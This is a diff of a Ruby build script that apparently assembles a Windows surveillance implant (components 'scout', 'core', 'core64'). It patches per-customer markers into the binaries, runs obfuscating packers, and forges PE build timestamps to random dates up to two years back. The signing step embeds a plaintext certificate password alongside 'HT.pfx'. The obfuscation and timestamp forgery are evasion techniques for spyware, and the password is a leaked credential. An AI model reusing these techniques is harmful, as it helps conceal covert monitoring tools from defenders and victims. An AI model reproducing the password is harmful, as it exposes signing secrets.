@@ -54,7 +54,7 @@ class BuildWindows < Build
       begin
         # patching for the function name
         marker = "Funcname"
-        content.binary_patch 'PFTBBP', @funcname
+        patch_func_names(content)
 
         # the new registry key
         marker = "Registry key"
@@ -70,12 +70,11 @@ class BuildWindows < Build
     end
 
     # we have an exception here, the core64 must be patched only with some values
-
     patch_file(:file => 'core64') do |content|
       begin
         # patching for the function name
         marker = "Funcname"
-        content.binary_patch 'PFTBBP', @funcname
+        patch_func_names(content)
 
         # per-customer signature
         marker = "Signature"
@@ -97,17 +96,13 @@ class BuildWindows < Build
     patch_build_time('scout')
     patch_build_time('core')
     patch_build_time('core64')
+    patch_build_time('codec')
+    patch_build_time('sqlite')
 
     # code obfuscator
     CrossPlatform.exec path('packer32'), "#{path('core')}"
     CrossPlatform.exec path('packer64'), "#{path('core64')}"
-
-    # add random bytes to codec, rapi and sqlite
     CrossPlatform.exec path('packer'), "#{path('codec')}"
-
-    patch_build_time(path('sqlite'))
-    add_random(path('sqlite'))
-
   end
 
   def scramble
@@ -412,7 +407,8 @@ class BuildWindows < Build
     CrossPlatform.exec path('verpatch'), "/fn /va #{path('scout')} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
 
     # sign it
-    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("comodo.cer")} #{path('scout')}" if to_be_signed?
+    #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("globalsign.cer")} #{path('scout')}" if to_be_signed?
+    CrossPlatform.exec path('signtool'), "sign /P GeoMornellaChallenge7 /f #{Config.instance.cert("HT.pfx")} #{path('scout')}" if to_be_signed?
   end
 
   def customize_icon(file, icon)
@@ -434,11 +430,22 @@ class BuildWindows < Build
       begin
         offset = content.index("PE\x00\x00")
         raise if offset.nil?
-        content.binary_patch_at_offset offset + 8, SecureRandom.random_bytes(4)
+        # random time is NOW - rand(two year) (3600*24*365*2 -> 63072000)
+        time = Time.now.to_i + rand(-63072000..0)
+        content.binary_patch_at_offset offset + 8, [time].pack('I')
       rescue
         raise "build time offset not found"
       end
     end
+  end
+
+  def patch_func_names(content)
+    markers = ['PFTBBP']
+    names = [@funcname]
+    markers.each_with_index do |find, index|
+      content.binary_patch find, names[index]
+    end
+    content
   end
 
 end
